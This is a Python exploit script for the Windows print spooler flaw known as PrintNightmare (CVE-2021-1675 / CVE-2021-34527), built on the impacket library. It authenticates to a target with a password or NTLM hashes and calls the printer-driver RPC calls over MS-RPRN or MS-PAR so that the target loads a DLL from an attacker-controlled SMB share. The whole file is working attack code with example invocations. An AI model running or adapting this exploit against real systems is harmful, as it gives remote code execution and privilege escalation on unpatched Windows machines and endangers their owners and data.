#!/usr/bin/python3
import impacket
from impacket import smbconnection
from impacket.dcerpc.v5 import rprn, par, epm, rpcrt
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.smbconnection import SessionError
from impacket.structure import Structure
import argparse
import sys
import pathlib
import uuid
#import re

parser = argparse.ArgumentParser(add_help = True, description = "MS-RPRN PrintNightmare CVE-2021-1675 / CVE-2021-34527 implementation.",formatter_class=argparse.RawDescriptionHelpFormatter,epilog="""
Example;
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll'
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll' 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL'
    """)
parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
parser.add_argument('share', action='store', help='Path to DLL. Example \'\\\\10.10.10.10\\share\\evil.dll\'')
parser.add_argument('pDriverPath', action='store', help='Driver path. Example \'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL\'', nargs="?")
authType = parser.add_argument_group('authentication')
authType.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is [LMHASH:]NTHASH')
authType = parser.add_argument_group('connection')
authType.add_argument('-target-ip', action='store', metavar="ip address",
                    help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                        'This is useful when target is the NetBIOS name and you cannot resolve it')
authType.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                    help='Destination port to connect to SMB Server')
rpcType = parser.add_mutually_exclusive_group(required=True)
rpcType.add_argument('-rprn', action='store_true', help='Use MS-RPRN')
rpcType.add_argument('-par', action='store_true', help='Use MS-PAR')
parser.add_argument('-arch', action='store', default='x64', required=False, help='Architecture of target, x64 or x86')

options = parser.parse_args()

domain = ''
username = ''
password = ''
address = ''
lmhash = ''
nthash = ''

#https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/2825d22e-c5a5-47cd-a216-3e903fd6e030
class DRIVER_INFO_2_BLOB(Structure):
    structure = (
        ('cVersion','<L'),
        ('NameOffset', '<L'),
        ('EnvironmentOffset', '<L'),
        ('DriverPathOffset', '<L'),
        ('DataFileOffset', '<L'),
        ('ConfigFileOffset', '<L'),
    )

    def __init__(self, data = None):
        Structure.__init__(self, data = data)
    
    def fromString(self, data, offset=0):
        Structure.fromString(self, data)
        self['ConfigFileArray'] = self.rawData[self['ConfigFileOffset']+offset:self['DataFileOffset']+offset].decode('utf-16-le')
        self['DataFileArray'] = self.rawData[self['DataFileOffset']+offset:self['DriverPathOffset']+offset].decode('utf-16-le')
        self['DriverPathArray'] = self.rawData[self['DriverPathOffset']+offset:self['EnvironmentOffset']+offset].decode('utf-16-le')
        self['EnvironmentArray'] = self.rawData[self['EnvironmentOffset']+offset:self['NameOffset']+offset].decode('utf-16-le')
        #self['NameArray'] = self.rawData[self['NameOffset']+offset:len(self.rawData)].decode('utf-16-le')

class DRIVER_INFO_2_ARRAY(Structure):
    def __init__(self, data = None, pcReturned = None):
        Structure.__init__(self, data = data)
        self['drivers'] = list()
        remaining = data
        if data is not None:
            for i in range(pcReturned):
                attr = DRIVER_INFO_2_BLOB(remaining)
                self['drivers'].append(attr)
                remaining = remaining[len(attr):]

def connectRPRN(username, password, domain, lmhash, nthash, address, port):
    binding = r'ncacn_np:{0}[\PIPE\spoolss]'.format(address)
    rpctransport = transport.DCERPCTransportFactory(binding)

    rpctransport.set_connect_timeout(30)
    rpctransport.set_dport(port)
    rpctransport.setRemoteHost(address)
    
    if hasattr(rpctransport, 'set_credentials'):
        # This method exists only for selected protocol sequences.
        rpctransport.set_credentials(username, password, domain, lmhash, nthash)

    print("[*] Connecting to {0}".format(binding))
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(rprn.MSRPC_UUID_RPRN)
    print("[+] Bind OK")

    return dce

def connectPAR(username, password, domain, lmhash, nthash, address):
    stringbinding = epm.hept_map(address, par.MSRPC_UUID_PAR, protocol='ncacn_ip_tcp')
    rpctransport = transport.DCERPCTransportFactory(stringbinding)

    rpctransport.set_connect_timeout(30)

    print("Connecting to {0}".format(stringbinding))
    rpctransport.set_credentials(username, password, domain, lmhash, nthash)
    dce = rpctransport.get_dce_rpc()
    dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    dce.connect()

    dce.bind(par.MSRPC_UUID_PAR, transfer_syntax = ('8A885D04-1CEB-11C9-9FE8-08002B104860', '2.0'))
    print("Bind OK")
    return dce

def getDriverDirectory(dce, environment, handle=NULL):
    if(options.par):
        resp = par.hRpcAsyncGetPrinterDriverDirectory(dce, pName=handle, pEnvironment=environment, Level=1)
    else:
        resp = rprn.hRpcGetPrinterDriverDirectory(dce, pName=handle, pEnvironment=environment, Level=1)
    directory = formatByteList(resp['pDriverDirectory'])
    return directory

def formatByteList(theList):
    string = ''
    for item in theList:
        if(item != b'\x00'):
            string += item.decode()
    return string

def generateDriverName():
    random = str(uuid.uuid4())
    return "w00tw00t-{0}-legitprinter".format(random)

def fillDriverStructure(pInfo2, isX64, isPar, dce):
    driverDirectory = str(pathlib.PureWindowsPath(getDriverDirectory(dce, isX64)))
    pInfo2['pDriverPath']  = "{0}\\3\\{1}".format(driverDirectory, "mxdwdrv.dll")
    pInfo2['pDataFile']    = "{0}\\3\\{1}".format(driverDirectory, "mxdwdrv.dll")
    return pInfo2

def addPrinterDriver(isPar, dce, pInfo2, flags):
    #do stuff here
    container_info = par.DRIVER_CONTAINER() if options.par else rprn.DRIVER_CONTAINER()
    container_info['Level'] = 2
    container_info['DriverInfo']['tag'] = 2
    container_info['DriverInfo']['Level2']['cVersion']     = pInfo2['cVersion']
    container_info['DriverInfo']['Level2']['pName']        = pInfo2['pName'] + '\x00'
    container_info['DriverInfo']['Level2']['pEnvironment'] = pInfo2['pEnvironment'] + '\x00'
    container_info['DriverInfo']['Level2']['pDriverPath']  = pInfo2['pDriverPath'] + '\x00'
    container_info['DriverInfo']['Level2']['pDataFile']    = pInfo2['pDataFile'] + '\x00'
    container_info['DriverInfo']['Level2']['pConfigFile']  = pInfo2['pConfigFile'] + '\x00'

    print("{0} / {1} - 0x{2} - {3} - {4}".format(pInfo2['pName'], pInfo2['pEnvironment'], format(flags, '08x'), pInfo2['pConfigFile'], pInfo2['pDriverPath']))
    try:
        if(isPar):
            resp = par.hRpcAsyncAddPrinterDriver(dce, NULL, pDriverContainer=container_info, dwFileCopyFlags=flags)
        else:
            resp = rprn.hRpcAddPrinterDriverEx(dce, NULL, pDriverContainer=container_info, dwFileCopyFlags=flags)

    except (smbconnection.SessionError, ConnectionResetError) as e:
        if(options.par):
            import errno
            if e.errno == errno.ECONNRESET:
                print("[+] Exploit Complete")
            else:
                print("[-] Exploit Failed")
        else:
            if e.getErrorCode() == 0xC000014B:
                print("[+] Exploit Complete")
            else:
                print("[-] Exploit Failed")
        pass

if __name__ == '__main__':
    import re
    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
        options.target).groups('')

    #In case the password contains '@'
    if '@' in address:
        password = password + '@' + address.rpartition('@')[0]
        address = address.rpartition('@')[2]

    if options.target_ip is None:
        options.target_ip = address

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    if options.arch == 'x64':
        environment = "Windows x64\x00"
        isX64 = True
    else:
        environment = "Windows NT x86\x00"
        isX64 = False

    if "\\\\" in options.share:
        options.share = options.share.replace("\\\\", "\\??\\UNC\\")

    pInfo2 = rprn.DRIVER_INFO_2()
    pInfo2['cVersion'] = 3
    pInfo2['pName'] = generateDriverName()
    pInfo2['pEnvironment'] = environment
    pInfo2['pConfigFile'] = options.share
    #connect

    if(options.par):
        dce = connectPAR(username, password, domain, lmhash, nthash, options.target_ip)
    else:
        dce = connectRPRN(username, password, domain, lmhash, nthash, options.target_ip, options.port)
    handle = NULL

    fillDriverStructure(pInfo2, environment, options.par, dce)

    addPrinterDriver(options.par, dce, pInfo2, rprn.APD_COPY_FROM_DIRECTORY | rprn.APD_COPY_NEW_FILES | rprn.APD_INSTALL_WARNED_DRIVER)
    


    #print("[+] pDriverPath Found {0}".format(pDriverPath))
    #print("[*] Executing {0}".format(options.share))
